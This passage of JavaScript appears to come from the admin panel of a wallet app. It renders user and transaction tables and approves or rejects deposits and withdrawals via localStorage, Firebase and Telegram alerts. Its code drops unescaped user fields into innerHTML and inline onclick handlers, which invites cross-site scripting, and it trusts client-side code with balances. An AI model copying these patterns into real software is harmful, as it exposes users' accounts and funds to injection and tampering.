            <td style="color:#38bdf8;"><b>${curr} ${formatAmountLocale(mainBal)}</b></td>
            <td style="color:#a855f7;"><b>${curr} ${formatAmountLocale(limitBal)}</b></td>
            <td>
                <button onclick="adminDeleteUser('${u.email || u.phone}')" class="btn-delete-user">Delete & Ban</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function renderAdminPendingList() {
    const tbody = document.getElementById('adminPendingTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    const pendingTxs = allTransactions.filter(t => t.status === 'Pending');

    if (pendingTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:#94a3b8;">কোনো পেন্ডিং রিকোয়েস্ট নেই।</td></tr>`;
        return;
    }

    pendingTxs.forEach(t => {
        const tr = document.createElement('tr');
        const curr = t.currency || '৳';

        tr.innerHTML = `
            <td><b>${t.userName || t.userEmail}</b></td>
            <td style="color:#f59e0b;"><b>${t.type}</b></td>
            <td>${t.method}</td>
            <td>${t.phone}</td>
            <td style="color:#38bdf8;"><b>${curr} ${formatAmountLocale(t.amount)}</b></td>
            <td><code>${t.trxId}</code></td>
            <td>
                <button onclick="approveTransaction(${t.id})" class="btn-approve">Approve</button>
                <button onclick="rejectTransaction(${t.id})" class="btn-reject">Reject</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function renderAdminAllHistory() {
    const tbody = document.getElementById('adminAllHistoryTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (allTransactions.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">কোনো ডাটা নেই।</td></tr>`;
        return;
    }

    allTransactions.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;

        const curr = t.currency || '৳';

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><b>${t.userName || t.userEmail}</b></td>
            <td>${t.type}</td>
            <td>${t.method}</td>
            <td>${curr} ${formatAmountLocale(t.amount)}</td>
            <td><code>${t.trxId}</code></td>
            <td>${statusBadge}</td>
        `;
        tbody.appendChild(tr);
    });
}

async function approveTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex === -1) return;

    const tx = allTransactions[txIndex];
    const userIndex = usersDatabase.findIndex(u => u.email === tx.userEmail || u.phone === tx.userEmail);

    if (userIndex !== -1) {
        const targetUser = usersDatabase[userIndex];
        if (!targetUser.balances) targetUser.balances = { ...defaultBalances };
        if (targetUser.totalBalance === undefined) {
            targetUser.totalBalance = targetUser.balances.WorldBank !== undefined ? targetUser.balances.WorldBank : 0.00;
        }

        if (tx.type === 'Withdraw' || tx.type === 'TopUp' || tx.type === 'Card/Bank Transfer') {
            targetUser.totalBalance -= tx.amount;
        } else if (tx.type === 'Deposit') {
            targetUser.totalBalance += tx.amount;
        }

        usersDatabase[userIndex] = targetUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(targetUser);

        allTransactions[txIndex].status = 'Approved';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        await saveTxToFirebase(allTransactions[txIndex]);

        const curr = getUserCurrency(targetUser);
        sendTelegramNotification(`✅ <b>ট্রানজেকশন অ্যাপ্রুভড!</b>\n\n👤 ইউজার: ${tx.userName}\n💰 পরিমাণ: ${curr}${tx.amount}`);

        showCustomAlert("সফল", 'ট্রানজেকশন সফলভাবে অ্যাপ্রুভ করা হয়েছে!');

        if (activeUser && (activeUser.email === targetUser.email || activeUser.phone === targetUser.phone)) {
            activeUser = targetUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }

        renderAdminPendingList();
        renderAdminUsersList();
        renderAdminAllHistory();
    }
}

async function rejectTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex !== -1) {
        allTransactions[txIndex].status = 'Rejected';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        await saveTxToFirebase(allTransactions[txIndex]);

        showCustomAlert("সফল", 'রিকোয়েস্টটি রিজেক্ট করা হয়েছে।');

        renderAdminPendingList();
        renderAdminAllHistory();
    }
}